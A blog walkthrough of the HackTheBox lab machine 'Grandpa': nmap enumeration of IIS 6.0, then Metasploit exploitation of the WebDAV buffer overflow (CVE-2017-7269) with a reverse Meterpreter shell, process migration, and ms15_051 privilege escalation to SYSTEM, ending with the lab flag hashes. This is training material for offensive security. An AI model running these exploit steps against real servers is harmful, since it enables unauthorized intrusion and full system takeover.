---
layout: post
title: HackTheBox Grandpa
date: 2017-04-12
tags: [HackTheBox, Windows]
---

# Machine Synopsis

Grandpa is one of the simpler machines on Hack The Box, however it covers the widely-exploited CVE-2017-7269. This vulnerability is trivial to exploit and granted immediate access to thousands of IIS servers around the globe when it became public knowledge. ([Source](https://www.hackthebox.com/machines/grandpa))

# Enumeration
```bash
┌──(root💀Shiro)-[/home/shiro]
└─# nmap -sC -sV -A 10.10.10.14
Nmap scan report for 10.10.10.14
Host is up (0.18s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|   Server Date: Sun, 23 May 2021 07:09:19 GMT
|   WebDAV type: Unknown
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2003|2008|XP|2000 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_server_2008::sp2 cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_2000::sp4
Aggressive OS guesses: Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows Server 2008 Enterprise SP2 (92%), Microsoft Windows Server 2003 SP2 (91%), Microsoft Windows 2003 SP2 (91%), Microsoft Windows XP SP3 (90%), Microsoft Windows 2000 SP4 or Windows XP Professional SP1 (90%), Microsoft Windows XP (87%), Microsoft Windows Server 2003 SP1 - SP2 (86%), Microsoft Windows XP SP2 or Windows Server 2003 (86%), Microsoft Windows 2000 SP4 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   179.39 ms 10.10.14.1
2   179.43 ms 10.10.10.14

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.73 seconds
```
Let’s check out their website!

![Website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Grandpa/Website.png?raw=true)

Seems like there’s nothing much.. but luckily the `nmap` scan showed the version of the server, so let’s do some vulnerability check on it!

```bash
┌──(root💀Shiro)-[/home/shiro]
└─# searchsploit iis 6.0
...
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                           | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                            | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                        | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                        | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                    | windows/remote/8754.patch
...
```
Out of all the possible exploits, the `WebDAV` exploit seems to be the most relevant.

# Exploitation

Let’s spin up `Metasploit` and use the `webdav` exploit!

```bash
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOST 10.10.10.14
RHOST => 10.10.10.14
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set LHOST 10.10.14.4
LHOST => 10.10.14.4
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > check
[+] 10.10.10.14:80 - The target is vulnerable.
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > exploit

[*] Started reverse TCP handler on 10.10.14.4:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175174 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.14.4:4444 -> 10.10.10.14:1030) at 2021-05-23 15:19:05 +0800

meterpreter > sysinfo
Computer        : GRANPA
OS              : Windows .NET Server (5.2 Build 3790, Service Pack 2).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows

meterpreter > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 2156 created.
Channel 2 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>cd c:\Documents and Settings
C:\Documents and Settings>dir
04/12/2017  05:32 PM    <DIR>          .
04/12/2017  05:32 PM    <DIR>          ..
04/12/2017  05:12 PM    <DIR>          Administrator
04/12/2017  05:03 PM    <DIR>          All Users
04/12/2017  05:32 PM    <DIR>          Harry

C:\Documents and Settings>cd Harry
Access is denied.
```
# Privilege Escalation

It seems like we do not have enough rights to access `Harry`’s directory. We can try migrating to a NT Authority running process instead. 

```bash
C:\Documents and Settings>exit
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 212   1080  cidaemon.exe
...
 1816  612   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1916  396   dllhost.exe
 2220  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2288  612   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
...

meterpreter > migrate 1816
[*] Migrating from 2796 to 1816...
[*] Migration completed successfully.

meterpreter > shell
Process 2492 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>whoami
nt authority\network service

C:\WINDOWS\system32>cd c:\Documents and Settings

C:\Documents and Settings>cd Harry
Access is denied.
```
It seems like we still do not have enough rights to access `Harry`’s directory. We can use Metasploit’s `local_exploit_suggester` to look for possible exploit vectors.

```bash
C:\Documents and Settings>exit
meterpreter > run post/multi/recon/local_exploit_suggester 
...
[+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
```
There are a few exploits! Let’s use the `ms15_051_client_copy_image` exploit.

```bash
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > use exploit/windows/local/ms15_051_client_copy_image 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms15_051_client_copy_image) > set LHOST 10.10.14.4
LHOST => 10.10.14.4
msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1
session => 1
msf6 exploit(windows/local/ms15_051_client_copy_image) > exploit
...
[*] Sending stage (175174 bytes) to 10.10.10.14
[*] Meterpreter session 2 opened (10.10.14.4:4444 -> 10.10.10.14:1032) at 2021-05-23 15:33:10 +0800

meterpreter > shell
Process 2548 created.
Channel 1 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\system32>whoami
whoami
nt authority\system

C:\Documents and Settings\Harry\Desktop>type user.txt
bdff5ec67c3cff017f2bedc146a5d869

C:\Documents and Settings\Administrator\Desktop>type root.txt
9359e905a2c35f861f6a57cecf28bb7b
```
